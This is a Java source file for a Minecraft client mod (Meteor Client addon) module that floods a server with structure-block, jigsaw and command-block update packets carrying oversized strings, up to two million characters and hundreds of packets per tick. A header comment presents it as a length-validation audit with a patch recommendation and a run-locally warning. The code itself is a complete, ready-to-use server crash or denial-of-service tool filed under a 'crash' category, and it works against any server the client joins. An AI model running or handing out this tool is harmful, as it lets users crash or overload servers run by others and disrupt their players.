package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.block.entity.CommandBlockBlockEntity;
import net.minecraft.block.entity.JigsawBlockEntity;
import net.minecraft.block.entity.StructureBlockBlockEntity;
import net.minecraft.block.enums.StructureBlockMode;
import net.minecraft.network.packet.c2s.play.UpdateCommandBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateJigsawC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateStructureBlockC2SPacket;
import net.minecraft.util.BlockMirror;
import net.minecraft.util.BlockRotation;
import net.minecraft.util.Identifier;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3i;

/**
 * AUDIT: Structure / Jigsaw / Command-Block String Flood
 *
 * The structure-block, jigsaw, and command-block update packets each carry
 * free-form string fields (structure name + metadata, jigsaw final-state,
 * command-block command) that the less-trodden GUIs rarely length-check on the
 * client. This sends those packets with an oversized string in each field, at a
 * configurable rate, to test the server's length validation on these inputs.
 *
 * These are normally op-gated, but the packet is still parsed/handled before the
 * permission outcome on many implementations - so an unbounded string field is a
 * memory/CPU surface regardless of whether the edit ultimately applies.
 *
 * Patch signal: enforce strict maximum lengths on every string field of these
 * packets at decode time, and reject (don't merely ignore) over-length input
 * before allocating or processing it.
 *
 * Run against your OWN local server only.
 */
public class StructureStringFlood extends Module {
    public enum Target { STRUCTURE, JIGSAW, COMMAND_BLOCK, ALL }

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Target> target = sgGeneral.add(new EnumSetting.Builder<Target>()
        .name("target").description("Which packet's string fields to flood.")
        .defaultValue(Target.ALL).build()
    );
    private final Setting<Integer> length = sgGeneral.add(new IntSetting.Builder()
        .name("string-length").description("Characters in each oversized string field.")
        .defaultValue(30000).range(64, 2000000).sliderRange(1000, 100000).build()
    );
    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("packets-per-tick").description("Packets sent each tick.")
        .defaultValue(20).min(1).sliderMax(500).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public StructureStringFlood() {
        super(AddonTemplate.CRASH_CATEGORY, "structure-string-flood",
            "Floods structure/jigsaw/command-block packets with oversized string fields. Tests string length validation.");
    }

    private String bigString() {
        return "A".repeat(length.get());
    }

    @Override
    public void onActivate() { ticksActive = 0; packetsSent = 0; }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        BlockPos pos = mc.player.getBlockPos();
        String big = bigString();

        for (int i = 0; i < amount.get(); i++) {
            switch (target.get()) {
                case STRUCTURE -> sendStructure(pos, big);
                case JIGSAW -> sendJigsaw(pos, big);
                case COMMAND_BLOCK -> sendCommandBlock(pos, big);
                case ALL -> { sendStructure(pos, big); sendJigsaw(pos, big); sendCommandBlock(pos, big); }
            }
        }
    }

    private void sendStructure(BlockPos pos, String big) {
        mc.player.networkHandler.sendPacket(new UpdateStructureBlockC2SPacket(
            pos, StructureBlockBlockEntity.Action.UPDATE_DATA, StructureBlockMode.DATA,
            big, BlockPos.ORIGIN, new Vec3i(1, 1, 1),
            BlockMirror.NONE, BlockRotation.NONE, big,
            true, false, false, true, 1.0f, 0L));
            packetsSent++;
    }

    private void sendJigsaw(BlockPos pos, String big) {
        Identifier id = Identifier.of("minecraft", "empty");
        mc.player.networkHandler.sendPacket(new UpdateJigsawC2SPacket(
            pos, id, id, id, big, JigsawBlockEntity.Joint.ALIGNED, 0, 0));
            packetsSent++;
    }

    private void sendCommandBlock(BlockPos pos, String big) {
        mc.player.networkHandler.sendPacket(new UpdateCommandBlockC2SPacket(
            pos, big, CommandBlockBlockEntity.Type.REDSTONE, false, false, false));
            packetsSent++;
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
